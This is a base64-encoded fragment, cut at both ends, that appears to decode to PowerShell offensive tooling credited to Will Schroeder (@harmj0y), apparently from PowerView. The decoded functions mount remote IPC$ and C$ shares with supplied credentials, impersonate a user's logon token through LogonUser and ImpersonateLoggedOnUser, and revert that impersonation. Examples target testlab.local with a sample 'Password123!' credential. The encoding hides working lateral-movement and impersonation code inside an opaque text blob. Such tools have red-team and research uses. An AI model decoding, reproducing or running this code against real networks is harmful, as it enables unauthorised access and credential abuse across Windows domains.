ZW50aXR5CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LVByaW5jaXBhbENvbnRleHRdIEJpbmRpbmcgdG8gZG9tYWluICckRG9tYWluJyIKICAgICAgICAgICAgICAgICRDb25uZWN0VGFyZ2V0ID0gJERvbWFpbgogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1tHZXQtUHJpbmNpcGFsQ29udGV4dF0gVXNpbmcgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzJwogICAgICAgICAgICAgICAgJENvbnRleHQgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuUHJpbmNpcGFsQ29udGV4dCAtQXJndW1lbnRMaXN0IChbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LkNvbnRleHRUeXBlXTo6RG9tYWluLCAkQ29ubmVjdFRhcmdldCwgJENyZWRlbnRpYWwuVXNlck5hbWUsICRDcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50aWFsKCkuUGFzc3dvcmQpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkQ29udGV4dCA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5QcmluY2lwYWxDb250ZXh0IC1Bcmd1bWVudExpc3QgKFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuQ29udGV4dFR5cGVdOjpEb21haW4sICRDb25uZWN0VGFyZ2V0KQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1tHZXQtUHJpbmNpcGFsQ29udGV4dF0gVXNpbmcgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzJwogICAgICAgICAgICAgICAgJERvbWFpbk5hbWUgPSBHZXQtRG9tYWluIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgTmFtZQogICAgICAgICAgICAgICAgJENvbnRleHQgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuUHJpbmNpcGFsQ29udGV4dCAtQXJndW1lbnRMaXN0IChbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LkNvbnRleHRUeXBlXTo6RG9tYWluLCAkRG9tYWluTmFtZSwgJENyZWRlbnRpYWwuVXNlck5hbWUsICRDcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50aWFsKCkuUGFzc3dvcmQpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkQ29udGV4dCA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5QcmluY2lwYWxDb250ZXh0IC1Bcmd1bWVudExpc3QgKFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuQ29udGV4dFR5cGVdOjpEb21haW4pCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJE9iamVjdElkZW50aXR5ID0gJElkZW50aXR5CiAgICAgICAgfQoKICAgICAgICAkT3V0ID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29udGV4dCcgJENvbnRleHQKICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lkZW50aXR5JyAkT2JqZWN0SWRlbnRpdHkKICAgICAgICAkT3V0CiAgICB9CiAgICBjYXRjaCB7CiAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1QcmluY2lwYWxDb250ZXh0XSBFcnJvciBjcmVhdGluZyBiaW5kaW5nIGZvciBvYmplY3QgKCckSWRlbnRpdHknKSBjb250ZXh0IDogJF8iCiAgICB9Cn0KCgpmdW5jdGlvbiBBZGQtUmVtb3RlQ29ubmVjdGlvbiB7CjwjCi5TWU5PUFNJUwoKUHNldWRvICJtb3VudHMiIGEgY29ubmVjdGlvbiB0byBhIHJlbW90ZSBwYXRoIHVzaW5nIHRoZSBzcGVjaWZpZWQKY3JlZGVudGlhbCBvYmplY3QsIGFsbG93aW5nIGZvciBhY2Nlc3Mgb2YgcmVtb3RlIHJlc291cmNlcy4gSWYgYSAtUGF0aCBpc24ndApzcGVjaWZpZWQsIGEgLUNvbXB1dGVyTmFtZSBpcyByZXF1aXJlZCB0byBwc2V1ZG8tbW91bnQgSVBDJC4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogUFNSZWZsZWN0ICAKCi5ERVNDUklQVElPTgoKVGhpcyBmdW5jdGlvbiB1c2VzIFdOZXRBZGRDb25uZWN0aW9uMlcgdG8gbWFrZSBhICd0ZW1wb3JhcnknIChpLmUuIG5vdCBzYXZlZCkgY29ubmVjdGlvbgp0byB0aGUgc3BlY2lmaWVkIHJlbW90ZSAtUGF0aCAoXFxVTkNcc2hhcmUpIHdpdGggdGhlIGFsdGVybmF0ZSBjcmVkZW50aWFscyBzcGVjaWZpZWQgaW4gdGhlCi1DcmVkZW50aWFsIG9iamVjdC4gSWYgYSAtUGF0aCBpc24ndCBzcGVjaWZpZWQsIGEgLUNvbXB1dGVyTmFtZSBpcyByZXF1aXJlZCB0byBwc2V1ZG8tbW91bnQgSVBDJC4KClRvIGRlc3Ryb3kgdGhlIGNvbm5lY3Rpb24sIHVzZSBSZW1vdmUtUmVtb3RlQ29ubmVjdGlvbiB3aXRoIHRoZSBzYW1lIHNwZWNpZmllZCBcXFVOQ1xzaGFyZSBwYXRoCm9yIC1Db21wdXRlck5hbWUuCgouUEFSQU1FVEVSIENvbXB1dGVyTmFtZQoKU3BlY2lmaWVzIHRoZSBzeXN0ZW0gdG8gYWRkIGEgXFxDb21wdXRlck5hbWVcSVBDJCBjb25uZWN0aW9uIGZvci4KCi5QQVJBTUVURVIgUGF0aAoKU3BlY2lmaWVzIHRoZSByZW1vdGUgXFxVTkNccGF0aCB0byBhZGQgdGhlIGNvbm5lY3Rpb24gZm9yLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSByZW1vdGUgc3lzdGVtLgoKLkVYQU1QTEUKCiRDcmVkID0gR2V0LUNyZWRlbnRpYWwKQWRkLVJlbW90ZUNvbm5lY3Rpb24gLUNvbXB1dGVyTmFtZSAnUFJJTUFSWS50ZXN0bGFiLmxvY2FsJyAtQ3JlZGVudGlhbCAkQ3JlZAoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkFkZC1SZW1vdGVDb25uZWN0aW9uIC1QYXRoICdcXFBSSU1BUlkudGVzdGxhYi5sb2NhbFxDJFwnIC1DcmVkZW50aWFsICRDcmVkCgouRVhBTVBMRQoKJENyZWQgPSBHZXQtQ3JlZGVudGlhbApAKCdQUklNQVJZLnRlc3RsYWIubG9jYWwnLCdTRUNPTkRBUlkudGVzdGxhYi5sb2NhbCcpIHwgQWRkLVJlbW90ZUNvbm5lY3Rpb24gIC1DcmVkZW50aWFsICRDcmVkCiM+CgogICAgW0NtZGxldEJpbmRpbmcoRGVmYXVsdFBhcmFtZXRlclNldE5hbWUgPSAnQ29tcHV0ZXJOYW1lJyldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUsIFBhcmFtZXRlclNldE5hbWUgPSAnQ29tcHV0ZXJOYW1lJywgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0hvc3ROYW1lJywgJ2Ruc2hvc3RuYW1lJywgJ25hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgUGFyYW1ldGVyU2V0TmFtZSA9ICdQYXRoJywgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZVBhdHRlcm4oJ1xcXFwuKlxcLionKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFBhdGgsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsCiAgICApCgogICAgQkVHSU4gewogICAgICAgICROZXRSZXNvdXJjZUluc3RhbmNlID0gW0FjdGl2YXRvcl06OkNyZWF0ZUluc3RhbmNlKCRORVRSRVNPVVJDRVcpCiAgICAgICAgJE5ldFJlc291cmNlSW5zdGFuY2UuZHdUeXBlID0gMQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgICRQYXRocyA9IEAoKQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyTmFtZSddKSB7CiAgICAgICAgICAgIEZvckVhY2ggKCRUYXJnZXRDb21wdXRlck5hbWUgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICAgICAgJFRhcmdldENvbXB1dGVyTmFtZSA9ICRUYXJnZXRDb21wdXRlck5hbWUuVHJpbSgnXCcpCiAgICAgICAgICAgICAgICAkUGF0aHMgKz0gLCJcXCRUYXJnZXRDb21wdXRlck5hbWVcSVBDJCIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJFBhdGhzICs9ICwkUGF0aAogICAgICAgIH0KCiAgICAgICAgRm9yRWFjaCAoJFRhcmdldFBhdGggaW4gJFBhdGhzKSB7CiAgICAgICAgICAgICROZXRSZXNvdXJjZUluc3RhbmNlLmxwUmVtb3RlTmFtZSA9ICRUYXJnZXRQYXRoCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltBZGQtUmVtb3RlQ29ubmVjdGlvbl0gQXR0ZW1wdGluZyB0byBtb3VudDogJFRhcmdldFBhdGgiCgogICAgICAgICAgICAjIGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvd2luZG93cy9kZXNrdG9wL2FhMzg1NDEzKHY9dnMuODUpLmFzcHgKICAgICAgICAgICAgIyAgIENPTk5FQ1RfVEVNUE9SQVJZID0gNAogICAgICAgICAgICAkUmVzdWx0ID0gJE1wcjo6V05ldEFkZENvbm5lY3Rpb24yVygkTmV0UmVzb3VyY2VJbnN0YW5jZSwgJENyZWRlbnRpYWwuR2V0TmV0d29ya0NyZWRlbnRpYWwoKS5QYXNzd29yZCwgJENyZWRlbnRpYWwuVXNlck5hbWUsIDQpCgogICAgICAgICAgICBpZiAoJFJlc3VsdCAtZXEgMCkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiJFRhcmdldFBhdGggc3VjY2Vzc2Z1bGx5IG1vdW50ZWQiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICBUaHJvdyAiW0FkZC1SZW1vdGVDb25uZWN0aW9uXSBlcnJvciBtb3VudGluZyAkVGFyZ2V0UGF0aCA6ICQoKFtDb21wb25lbnRNb2RlbC5XaW4zMkV4Y2VwdGlvbl0kUmVzdWx0KS5NZXNzYWdlKSIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIFJlbW92ZS1SZW1vdGVDb25uZWN0aW9uIHsKPCMKLlNZTk9QU0lTCgpEZXN0cm95cyBhIGNvbm5lY3Rpb24gY3JlYXRlZCBieSBOZXctUmVtb3RlQ29ubmVjdGlvbi4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogUFNSZWZsZWN0ICAKCi5ERVNDUklQVElPTgoKVGhpcyBmdW5jdGlvbiB1c2VzIFdOZXRDYW5jZWxDb25uZWN0aW9uMiB0byBkZXN0cm95IGEgY29ubmVjdGlvbiBjcmVhdGVkIGJ5Ck5ldy1SZW1vdGVDb25uZWN0aW9uLiBJZiBhIC1QYXRoIGlzbid0IHNwZWNpZmllZCwgYSAtQ29tcHV0ZXJOYW1lIGlzIHJlcXVpcmVkIHRvCid1bm1vdW50JyBcXCRDb21wdXRlck5hbWVcSVBDJC4KCi5QQVJBTUVURVIgQ29tcHV0ZXJOYW1lCgpTcGVjaWZpZXMgdGhlIHN5c3RlbSB0byByZW1vdmUgYSBcXENvbXB1dGVyTmFtZVxJUEMkIGNvbm5lY3Rpb24gZm9yLgoKLlBBUkFNRVRFUiBQYXRoCgpTcGVjaWZpZXMgdGhlIHJlbW90ZSBcXFVOQ1xwYXRoIHRvIHJlbW92ZSB0aGUgY29ubmVjdGlvbiBmb3IuCgouRVhBTVBMRQoKUmVtb3ZlLVJlbW90ZUNvbm5lY3Rpb24gLUNvbXB1dGVyTmFtZSAnUFJJTUFSWS50ZXN0bGFiLmxvY2FsJwoKLkVYQU1QTEUKClJlbW92ZS1SZW1vdGVDb25uZWN0aW9uIC1QYXRoICdcXFBSSU1BUlkudGVzdGxhYi5sb2NhbFxDJFwnCgouRVhBTVBMRQoKQCgnUFJJTUFSWS50ZXN0bGFiLmxvY2FsJywnU0VDT05EQVJZLnRlc3RsYWIubG9jYWwnKSB8IFJlbW92ZS1SZW1vdGVDb25uZWN0aW9uCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlU2hvdWxkUHJvY2Vzc0ZvclN0YXRlQ2hhbmdpbmdGdW5jdGlvbnMnLCAnJyldCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZSA9ICdDb21wdXRlck5hbWUnKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZSA9ICdDb21wdXRlck5hbWUnLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnLCAnZG5zaG9zdG5hbWUnLCAnbmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBQYXJhbWV0ZXJTZXROYW1lID0gJ1BhdGgnLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlUGF0dGVybignXFxcXC4qXFwuKicpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUGF0aAogICAgKQoKICAgIFBST0NFU1MgewogICAgICAgICRQYXRocyA9IEAoKQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyTmFtZSddKSB7CiAgICAgICAgICAgIEZvckVhY2ggKCRUYXJnZXRDb21wdXRlck5hbWUgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICAgICAgJFRhcmdldENvbXB1dGVyTmFtZSA9ICRUYXJnZXRDb21wdXRlck5hbWUuVHJpbSgnXCcpCiAgICAgICAgICAgICAgICAkUGF0aHMgKz0gLCJcXCRUYXJnZXRDb21wdXRlck5hbWVcSVBDJCIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJFBhdGhzICs9ICwkUGF0aAogICAgICAgIH0KCiAgICAgICAgRm9yRWFjaCAoJFRhcmdldFBhdGggaW4gJFBhdGhzKSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltSZW1vdmUtUmVtb3RlQ29ubmVjdGlvbl0gQXR0ZW1wdGluZyB0byB1bm1vdW50OiAkVGFyZ2V0UGF0aCIKICAgICAgICAgICAgJFJlc3VsdCA9ICRNcHI6OldOZXRDYW5jZWxDb25uZWN0aW9uMigkVGFyZ2V0UGF0aCwgMCwgJFRydWUpCgogICAgICAgICAgICBpZiAoJFJlc3VsdCAtZXEgMCkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiJFRhcmdldFBhdGggc3VjY2Vzc2Z1bGx5IHVtbW91bnRlZCIKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIFRocm93ICJbUmVtb3ZlLVJlbW90ZUNvbm5lY3Rpb25dIGVycm9yIHVubW91bnRpbmcgJFRhcmdldFBhdGggOiAkKChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dJFJlc3VsdCkuTWVzc2FnZSkiCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBJbnZva2UtVXNlckltcGVyc29uYXRpb24gewo8IwouU1lOT1BTSVMKCkNyZWF0ZXMgYSBuZXcgInJ1bmFzIC9uZXRvbmx5IiB0eXBlIGxvZ29uIGFuZCBpbXBlcnNvbmF0ZXMgdGhlIHRva2VuLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBQU1JlZmxlY3QgIAoKLkRFU0NSSVBUSU9OCgpUaGlzIGZ1bmN0aW9uIHVzZXMgTG9nb25Vc2VyKCkgd2l0aCB0aGUgTE9HT04zMl9MT0dPTl9ORVdfQ1JFREVOVElBTFMgTG9nb25UeXBlCnRvIHNpbXVsYXRlICJydW5hcyAvbmV0b25seSIuIFRoZSByZXN1bHRpbmcgdG9rZW4gaXMgdGhlbiBpbXBlcnNvbmF0ZWQgd2l0aApJbXBlcnNvbmF0ZUxvZ2dlZE9uVXNlcigpIGFuZCB0aGUgdG9rZW4gaGFuZGxlIGlzIHJldHVybmVkIGZvciBsYXRlciB1c2FnZQp3aXRoIEludm9rZS1SZXZlcnRUb1NlbGYuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCB3aXRoIGFsdGVybmF0ZSBjcmVkZW50aWFscwp0byBpbXBlcnNvbmF0ZSBpbiB0aGUgY3VycmVudCB0aHJlYWQgc3BhY2UuCgouUEFSQU1FVEVSIFRva2VuSGFuZGxlCgpBbiBJbnRQdHIgVG9rZW5IYW5kbGUgcmV0dXJuZWQgYnkgYSBwcmV2aW91cyBJbnZva2UtVXNlckltcGVyc29uYXRpb24uCklmIHRoaXMgaXMgc3VwcGxpZWQsIExvZ29uVXNlcigpIGlzIHNraXBwZWQgYW5kIG9ubHkgSW1wZXJzb25hdGVMb2dnZWRPblVzZXIoKQppcyBleGVjdXRlZC4KCi5QQVJBTUVURVIgUXVpZXQKClN1cHByZXNzIGFueSB3YXJuaW5ncyBhYm91dCBTVEEgdnMgTVRBLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZAoKLk9VVFBVVFMKCkludFB0cgoKVGhlIFRva2VuSGFuZGxlIHJlc3VsdCBmcm9tIExvZ29uVXNlci4KIz4KCiAgICBbT3V0cHV0VHlwZShbSW50UHRyXSldCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZSA9ICdDcmVkZW50aWFsJyldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRUcnVlLCBQYXJhbWV0ZXJTZXROYW1lID0gJ0NyZWRlbnRpYWwnKV0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZSA9ICdUb2tlbkhhbmRsZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGwoKV0KICAgICAgICBbSW50UHRyXQogICAgICAgICRUb2tlbkhhbmRsZSwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUXVpZXQKICAgICkKCiAgICBpZiAoKFtTeXN0ZW0uVGhyZWFkaW5nLlRocmVhZF06OkN1cnJlbnRUaHJlYWQuR2V0QXBhcnRtZW50U3RhdGUoKSAtbmUgJ1NUQScpIC1hbmQgKC1ub3QgJFBTQm91bmRQYXJhbWV0ZXJzWydRdWlldCddKSkgewogICAgICAgIFdyaXRlLVdhcm5pbmcgIltJbnZva2UtVXNlckltcGVyc29uYXRpb25dIHBvd2Vyc2hlbGwuZXhlIGlzIG5vdCBjdXJyZW50bHkgaW4gYSBzaW5nbGUtdGhyZWFkZWQgYXBhcnRtZW50IHN0YXRlLCB0b2tlbiBpbXBlcnNvbmF0aW9uIG1heSBub3Qgd29yay4iCiAgICB9CgogICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9rZW5IYW5kbGUnXSkgewogICAgICAgICRMb2dvblRva2VuSGFuZGxlID0gJFRva2VuSGFuZGxlCiAgICB9CiAgICBlbHNlIHsKICAgICAgICAkTG9nb25Ub2tlbkhhbmRsZSA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgJE5ldHdvcmtDcmVkZW50aWFsID0gJENyZWRlbnRpYWwuR2V0TmV0d29ya0NyZWRlbnRpYWwoKQogICAgICAgICRVc2VyRG9tYWluID0gJE5ldHdvcmtDcmVkZW50aWFsLkRvbWFpbgogICAgICAgICRVc2VyTmFtZSA9ICROZXR3b3JrQ3JlZGVudGlhbC5Vc2VyTmFtZQogICAgICAgIFdyaXRlLVdhcm5pbmcgIltJbnZva2UtVXNlckltcGVyc29uYXRpb25dIEV4ZWN1dGluZyBMb2dvblVzZXIoKSB3aXRoIHVzZXI6ICQoJFVzZXJEb21haW4pXCQoJFVzZXJOYW1lKSIKCiAgICAgICAgIyBMT0dPTjMyX0xPR09OX05FV19DUkVERU5USUFMUyA9IDksIExPR09OMzJfUFJPVklERVJfV0lOTlQ1MCA9IDMKICAgICAgICAjICAgdGhpcyBpcyB0byBzaW11bGF0ZSAicnVuYXMuZXhlIC9uZXRvbmx5IiBmdW5jdGlvbmFsaXR5CiAgICAgICAgJFJlc3VsdCA9ICRBZHZhcGkzMjo6TG9nb25Vc2VyKCRVc2VyTmFtZSwgJFVzZXJEb21haW4sICROZXR3b3JrQ3JlZGVudGlhbC5QYXNzd29yZCwgOSwgMywgW3JlZl0kTG9nb25Ub2tlbkhhbmRsZSk7JExhc3RFcnJvciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCk7CgogICAgICAgIGlmICgtbm90ICRSZXN1bHQpIHsKICAgICAgICAgICAgdGhyb3cgIltJbnZva2UtVXNlckltcGVyc29uYXRpb25dIExvZ29uVXNlcigpIEVycm9yOiAkKChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRMYXN0RXJyb3IpLk1lc3NhZ2UpIgogICAgICAgIH0KICAgIH0KCiAgICAjIGFjdHVhbGx5IGltcGVyc29uYXRlIHRoZSB0b2tlbiBmcm9tIExvZ29uVXNlcigpCiAgICAkUmVzdWx0ID0gJEFkdmFwaTMyOjpJbXBlcnNvbmF0ZUxvZ2dlZE9uVXNlcigkTG9nb25Ub2tlbkhhbmRsZSkKCiAgICBpZiAoLW5vdCAkUmVzdWx0KSB7CiAgICAgICAgdGhyb3cgIltJbnZva2UtVXNlckltcGVyc29uYXRpb25dIEltcGVyc29uYXRlTG9nZ2VkT25Vc2VyKCkgRXJyb3I6ICQoKFtDb21wb25lbnRNb2RlbC5XaW4zMkV4Y2VwdGlvbl0gJExhc3RFcnJvcikuTWVzc2FnZSkiCiAgICB9CgogICAgV3JpdGUtVmVyYm9zZSAiW0ludm9rZS1Vc2VySW1wZXJzb25hdGlvbl0gQWx0ZXJuYXRlIGNyZWRlbnRpYWxzIHN1Y2Nlc3NmdWxseSBpbXBlcnNvbmF0ZWQiCiAgICAkTG9nb25Ub2tlbkhhbmRsZQp9CgoKZnVuY3Rpb24gSW52b2tlLVJldmVydFRvU2VsZiB7CjwjCi5TWU5PUFNJUwoKUmV2ZXJ0cyBhbnkgdG9rZW4gaW1wZXJzb25hdGlvbi4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogUFNSZWZsZWN0ICAKCi5ERVNDUklQVElPTgoKVGhpcyBmdW5jdGlvbiB1c2VzIFJldmVydFRvU2VsZigpIHRvIHJldmVydCBhbnkgaW1wZXJzb25hdGVkIHRva2Vucy4KSWYgLVRva2VuSGFuZGxlIGlzIHBhc3NlZCAodGhlIHRva2VuIGhhbmRsZSByZXR1cm5lZCBieSBJbnZva2UtVXNlckltcGVyc29uYXRpb24pLApDbG9zZUhhbmRsZSgpIGlzIHVzZWQgdG8gY2xvc2UgdGhlIG9wZW5lZCBoYW5kbGUuCgouUEFSQU1FVEVSIFRva2VuSGFuZGxlCgpBbiBvcHRpb25hbCBJbnRQdHIgVG9rZW5IYW5kbGUgcmV0dXJuZWQgYnkgSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCiRUb2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZApJbnZva2UtUmV2ZXJ0VG9TZWxmIC1Ub2tlbkhhbmRsZSAkVG9rZW4KIz4KCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbCgpXQogICAgICAgIFtJbnRQdHJdCiAgICAgICAgJFRva2VuSGFuZGxlCiAgICApCgogICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9rZW5IYW5kbGUnXSkgewogICAgICAgIFdyaXRlLVdhcm5pbmcgIltJbnZva2UtUmV2ZXJ0VG9TZWxmXSBSZXZlcnRpbmcgdG9rZW4gaW1wZXJzb25hdGlvbiBhbmQgY2xvc2luZyBMb2dvblVzZXIoKSB0b2tlbiBoYW5kbGUiCiAgICAgICAgJFJlc3VsdCA9ICRLZXJuZWwzMjo6Q2xvc2VIYW5kbGUoJFRva2VuSGFuZGxlKQogICAgfQoKICAgICRS